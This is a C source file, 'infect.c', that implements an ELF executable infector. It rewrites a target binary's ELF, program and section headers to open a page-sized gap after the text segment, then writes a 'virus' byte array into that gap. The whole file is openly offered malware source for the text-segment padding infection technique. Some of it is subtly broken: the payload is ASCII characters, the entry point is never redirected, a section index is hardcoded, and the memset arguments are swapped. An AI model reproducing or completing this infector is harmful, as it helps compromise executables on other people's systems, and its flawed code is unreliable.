/*
 * infect.c
 *
 *  Created on: 2013-11-16
 *      Author: huangtao
 */

#include <stdio.h>
#include <stdlib.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
//Define PAGESIZE,default 4K byte
#define PAGESIZE 4096

char virus[] = { 'f', 'f', '3', '5', '3', '0', '8', '3',
		'0', '4', '0', '8' };
int infect(char *ElfFile);

int virusSize = sizeof(virus);

int infect(char *ElfFile) {
	int fd;
	int oldShoff;
	int oldPhsize;
	int i = 0;
	Elf32_Ehdr ehdr;
	Elf32_Phdr phdr;
	Elf32_Shdr shdr;

	//Open ELF file and read the elf header part to &elfh
	fd = open(ElfFile, O_RDWR);
	read(fd, &ehdr, sizeof(ehdr));
	if ((strncmp(ehdr.e_ident, ELFMAG, SELFMAG)) != 0)
		exit(0);

	//Old section header offset of elf file
	oldShoff = ehdr.e_shoff;

	//Increase e_shoff by PAGESIZE in the ELF header
	ehdr.e_shoff += PAGESIZE;

	//if Virus Size is too large
	if (virusSize > (PAGESIZE - (ehdr.e_entry % PAGESIZE)))
		exit(0);

	int currentOff = 0;
	//The loop of read and modify program header
	for (i = 0; i < ehdr.e_phnum; i ++) {

		//seek and read to &Phdr
		lseek(fd, ehdr.e_phoff + i * ehdr.e_phentsize, SEEK_SET);
		read(fd, &phdr, sizeof(phdr));
		if (currentOff) {
			//For each phdr who's segment is after the insertion (text segment)
			//increase p_offset by PAGESIZE
			if(phdr.p_offset > currentOff){
				phdr.p_offset += PAGESIZE;
			}

			//write back
			lseek(fd, ehdr.e_phoff + i * ehdr.e_phentsize, SEEK_SET);
			write(fd, &phdr, sizeof(phdr));
		} else if (PT_LOAD == phdr.p_type && phdr.p_offset == 0) {
			if (phdr.p_filesz != phdr.p_memsz)
				exit(0);
			//Locate the elf header
			lseek(fd, 0, SEEK_SET);
			write(fd, &ehdr, sizeof(ehdr));

			oldPhsize = phdr.p_filesz;
			currentOff = phdr.p_offset + phdr.p_filesz;

			//Increase p_filesz and p_memsz
			phdr.p_filesz += virusSize;
			phdr.p_memsz += virusSize;

			//write back the program header
			lseek(fd, ehdr.e_phoff + i * ehdr.e_phentsize, SEEK_SET);
			write(fd, &phdr, sizeof(phdr));
		}
	}

	lseek(fd, oldShoff, SEEK_SET);
	//The loop of read and modify the section header
	for (i = 0; i < ehdr.e_shnum; i++) {
		lseek(fd, i * sizeof(shdr) + oldShoff, SEEK_SET);
		read(fd, &shdr, sizeof(shdr));

		if (i == 17) {
			//For the last shdr in the text segment	increase sh_size by the virus size
			shdr.sh_size += virusSize;
		} else if (i > 17) {
			shdr.sh_offset += PAGESIZE;
		}

		//Write Back
		lseek(fd, oldShoff + i * sizeof(shdr), SEEK_SET);
		write(fd, &shdr, sizeof(shdr));
	}

	//To get the file size FileStat.st_size
	struct stat FileStat;
	fstat(fd, &FileStat);

	char *Data = NULL;
	Data = (char*) malloc(FileStat.st_size - oldPhsize);
	lseek(fd, oldPhsize, SEEK_SET);
	read(fd, Data, FileStat.st_size - oldPhsize);

	//Insert code to the elf file
	lseek(fd, oldPhsize, SEEK_SET);
	write(fd, virus, sizeof(virus));

	char tmp[PAGESIZE] = { 0 };
	//Pad to PAGESIZE
	memset(tmp, PAGESIZE - virusSize, 0);
	write(fd, tmp, PAGESIZE - virusSize);
	write(fd, Data, FileStat.st_size - oldPhsize);

	free(Data);
	return 1;

}
//Just for test
int main(int argc, char **argv) {
	//How to use it
	if (argc != 2) {
		printf("Usage : infect \n");
		exit(0);
	}

	int test = infect(argv[1]);
	if (test != 1) {
		exit(0);
	}
	return 0;
}

